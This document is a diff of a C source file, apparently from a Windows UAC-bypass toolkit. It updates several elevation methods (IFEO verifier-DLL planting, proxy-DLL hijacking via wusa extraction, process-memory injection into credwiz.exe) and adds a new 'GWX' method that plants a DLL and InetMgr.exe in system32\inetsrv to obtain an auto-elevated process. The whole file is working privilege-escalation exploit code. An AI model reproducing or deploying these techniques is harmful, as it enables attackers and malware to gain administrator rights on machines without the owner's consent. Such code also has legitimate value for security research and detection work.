@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015
+*  (C) COPYRIGHT AUTHORS, 2015 - 2016
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     1.93
+*  VERSION:     2.00
 *
-*  DATE:        05 Nov 2015
+*  DATE:        16 Nov 2015
 *
 *  Hybrid UAC bypass methods.
 *
@@ -19,15 +19,10 @@
 #include "global.h"
 #include "makecab.h"
 
-ELOAD_PARAMETERS_4 g_ElevParamsH1N1;
+#include <Shlwapi.h>
+#pragma comment(lib, "shlwapi.lib")
 
-#define T_IFEO                L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
-#define T_AVRFDLL             L"Hibiki.dll"
-#define T_AVRF_SOURCEDLL      L"%temp%\\Hibiki.dll"
-#define T_AVRF_CMDLINE        L"/c wusa %ws /extract:%%windir%%\\system32"
-#define T_WINSATSRC           L"%temp%\\winsat.exe"
-#define T_WINSAT_CMDLINE      L"/c wusa %ws /extract:%%windir%%\\system32\\sysprep"
-#define T_WINSAT_TARGET       L"%systemroot%\\system32\\sysprep\\winsat.exe"
+ELOAD_PARAMETERS_4 g_ElevParamsH1N1;
 
 /*
 * ucmAvrfMethod
@@ -62,39 +57,29 @@ BOOL ucmAvrfMethod(
 		// Set new key security dacl
 		// Red Alert: manually restore IFEO key permissions after using this tool, as they are not inherited.
 		//
-		if (!ucmSimdaAlterKeySecurity(T_IFEO, T_SDDL_ALL_FOR_EVERYONE)) {
-			OutputDebugString(TEXT("[UCM] Failed to alter key security"));
+		if (!ucmSimdaAlterObjectSecurity(SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, T_IFEO, T_SDDL_ALL_FOR_EVERYONE))
 			break;
-		}
 
 		//open IFEO key
 		lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"),
 			0, KEY_ALL_ACCESS, &hKey);
-		if ((lRet != ERROR_SUCCESS) || (hKey == NULL)) {
-			OutputDebugString(TEXT("[UCM] Failed to open IFEO key"));
+		if ((lRet != ERROR_SUCCESS) || (hKey == NULL))
 			break;
-		}
 
 		//Set new key and values
 		hSubKey = NULL;
 		lRet = RegCreateKey(hKey, TEXT("cliconfg.exe"), &hSubKey);
-		if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS)) {
-			OutputDebugString(TEXT("[UCM] Failed to create IFEO subkey"));
+		if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS))
 			break;
-		}
 
 		lRet = RegSetValueEx(hSubKey, TEXT("GlobalFlag"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
-		if (lRet != ERROR_SUCCESS) {
-			OutputDebugString(TEXT("[UCM] Failed to set subkey value 1"));
+		if (lRet != ERROR_SUCCESS)
 			break;
-		}
 
 		dwValue = (DWORD)_strlen(T_AVRFDLL) * sizeof(TCHAR);
 		lRet = RegSetValueEx(hSubKey, TEXT("VerifierDlls"), 0, REG_SZ, (BYTE*)&T_AVRFDLL, dwValue);
-		if (lRet != ERROR_SUCCESS) {
-			OutputDebugString(TEXT("[UCM] Failed to set subkey value 2"));
+		if (lRet != ERROR_SUCCESS)
 			break;
-		}
 
 		// Cleanup registry, we don't need anymore.
 		RegCloseKey(hSubKey);
@@ -106,14 +91,12 @@ BOOL ucmAvrfMethod(
 		// Extract file to the protected directory
 		// First, create cab with fake msu ext, second run fusion process.
 		//
-		if (!ucmCreateCabinetForSingleFile(T_AVRF_SOURCEDLL, AvrfDll, AvrfDllSize)) {
+		if (!ucmCreateCabinetForSingleFile(T_AVRF_SOURCEDLL, AvrfDll, AvrfDllSize))
 			break;
-		}
+
 		// Drop Hibiki to system32
-		if (!ucmWusaExtractPackage(T_AVRF_CMDLINE)) {
-			OutputDebugString(TEXT("[UCM] Wusa failed copy Hibiki"));
+		if (!ucmWusaExtractPackage(T_AVRF_CMDLINE))
 			break;
-		}
 
 		// Finally run target fusion process.
 		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
@@ -208,11 +191,7 @@ BOOL ucmWinSATMethod(
 
 		//write proxy dll to disk
 		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
-			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
 			break;
-		}
-		else {
-			OutputDebugStringW(TEXT("[UCM] Dll dropped successfully"));
 		}
 
 		//
@@ -247,7 +226,6 @@ BOOL ucmWinSATMethod(
 				Cabinet = NULL;
 			}
 			else {
-				OutputDebugString(TEXT("[UCM] Error creating cab archive"));
 				break;
 			}
 
@@ -352,11 +330,7 @@ BOOL ucmMMCMethod(
 
 		//write proxy dll to disk
 		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
-			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
 			break;
-		}
-		else {
-			OutputDebugStringW(TEXT("[UCM] Dll dropped successfully"));
 		}
 
 		//expand string for target dir
@@ -460,11 +434,7 @@ BOOL ucmH1N1Method(
 			break;
 		}
 		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
-			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
 			break;
-		}
-		else {
-			OutputDebugStringW(TEXT("[UCM] Dll dropped successfully"));
 		}
 
 		//copy dll to wbem target folder
@@ -504,22 +474,21 @@ BOOL ucmH1N1Method(
 
 		//setup basic shellcode routines
 		RtlSecureZeroMemory(&g_ElevParamsH1N1, sizeof(g_ElevParamsH1N1));
-		elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ldp.hShell32, "ShellExecuteExW");
-		elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(g_ldp.hKernel32, "WaitForSingleObject");
-		elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(g_ldp.hKernel32, "CloseHandle");
+		elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ctx.hShell32, "ShellExecuteExW");
+		elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(g_ctx.hKernel32, "WaitForSingleObject");
+		elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(g_ctx.hKernel32, "CloseHandle");
 
 		//set shellcode 2nd stage target process
 		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-		_strcpy_w(elvpar->szTargetApp, g_ldp.szSystemDirectory); //c:\windows\system32\wbem\oobe.exe
+		_strcpy_w(elvpar->szTargetApp, g_ctx.szSystemDirectory); //c:\windows\system32\wbem\oobe.exe
 		_strcat_w(elvpar->szTargetApp, L"\\wbem\\oobe.exe");
 		_strcpy_w(elvpar->szVerb, L"runas");
-		_strcpy_w(szBuffer, g_ldp.szSystemDirectory); //c:\windows\system32\credwiz.exe
+		_strcpy_w(szBuffer, g_ctx.szSystemDirectory); //c:\windows\system32\credwiz.exe
 		_strcat_w(szBuffer, L"\\credwiz.exe");
 
 		//run 1st stage target process
 		hProcess = supRunProcessEx(szBuffer, NULL, NULL);
 		if (hProcess == NULL) {
-			OutputDebugString(TEXT("[UCM] Cannot open target process."));
 			break;
 		}
 
@@ -527,11 +496,9 @@ BOOL ucmH1N1Method(
 			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 		if (remotebuffer == NULL) {
-			OutputDebugString(TEXT("[UCM] Cannot allocate memory in target process."));
 			break;
 		}
 		if (!WriteProcessMemory(hProcess, remotebuffer, selfmodule, opth->SizeOfImage, &NumberOfBytesWritten)) {
-			OutputDebugString(TEXT("[UCM] Cannot write to the target process memory."));
 			break;
 		}
 
@@ -603,11 +570,7 @@ BOOL ucmGenericAutoelevation(
 
 		//write proxy dll to disk
 		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
-			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
 			break;
-		}
-		else {
-			OutputDebugStringW(TEXT("[UCM] Dll dropped successfully"));
 		}
 
 		//expand string for target dir
@@ -636,5 +599,111 @@ BOOL ucmGenericAutoelevation(
 
 	} while (cond);
 
+	return bResult;
+}
+
+#ifdef _WIN64
+#include "kongou64comp.h"
+#define KONGOU64 Kongou64Comp
+#else
+#endif
+
+/*
+* ucmMSFTGift
+*
+* Purpose:
+*
+* Bypass UAC by abusing newly added appinfo.dll backdoor.
+* IIS initially not installed in Windows client, but appinfo.dll whitelists IIS application as autoelevated.
+* We will use backdoor from "Get Windows 10" bullshit marketing promo package and exploit it with dll hijacking as usual.
+*
+*/
+BOOL ucmGWX(
+	VOID
+	)
+{
+	BOOL bResult = FALSE, cond = FALSE;
+	WCHAR szDest[MAX_PATH + 1];
+	WCHAR szTargetApp[MAX_PATH + 20];
+	WCHAR szBuffer[MAX_PATH * 2];
+	WCHAR szTempPath[MAX_PATH + 1];
+
+	PVOID Data = NULL;
+	ULONG DecompressedBufferSize = 0;
+
+	do {
+
+		//expand string for target dir
+		RtlSecureZeroMemory(szDest, sizeof(szDest));
+		if (ExpandEnvironmentStringsW(T_IIS_TARGETDIR,
+			szDest, MAX_PATH) == 0)
+		{
+			break;
+		}
+
+		_strcpy_w(szTargetApp, szDest);
+		_strcat_w(szTargetApp, TEXT("\\"));
+		_strcat_w(szTargetApp, T_IIS_TARGETAPP);
+		if (PathFileExistsW(szTargetApp)) {
+			//File already exist, could be IIS installed
+			OutputDebugString(TEXT("[UCM] IIS installed, abort"));
+			break;
+		}
+
+		//summon some unicorns
+		Data = DecompressPayload((CONST PVOID)KONGOUDLL, sizeof(KONGOUDLL), &DecompressedBufferSize);
+		if (Data == NULL)
+			break;
+			
+		//temp
+		RtlSecureZeroMemory(szTempPath, sizeof(szTempPath));
+		if (ExpandEnvironmentStrings(TEMPDIR, szTempPath, MAX_PATH) == 0) {
+			break;
+		}
+
+		//put target dll
+		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+		_strcpy_w(szBuffer, szTempPath);
+		_strcat_w(szBuffer, T_IIS_TARGETDLL);
+
+		//write proxy dll to disk
+		if (!supWriteBufferToFile(szBuffer, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+			break;
+		}
+
+		//drop fubuki to system32\inetsrv
+		bResult = ucmAutoElevateCopyFile(szBuffer, szDest);
+		if (!bResult) {
+			break;
+		}
+		DeleteFile(szBuffer);
+
+		//put target app
+		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+		_strcpy_w(szBuffer, szTempPath);
+		_strcat_w(szBuffer, T_IIS_TARGETAPP);
+
+		//write app to disk
+		if (!supWriteBufferToFile(szBuffer, Data, DecompressedBufferSize)) {
+			break;
+		}
+		
+		//drop InetMgr.exe to system32\inetsrv
+		bResult = ucmAutoElevateCopyFile(szBuffer, szDest);
+		if (!bResult) {
+			break;
+		}
+		DeleteFile(szBuffer);
+
+		bResult = supRunProcess(szTargetApp, NULL);
+		if (bResult) {
+			OutputDebugString(TEXT("Whoever created this gwx shit must be fired"));
+		}
+
+	} while (cond);
+
+	if (Data != NULL) {
+		VirtualFree(Data, 0, MEM_RELEASE);
+	}
 	return bResult;
 }
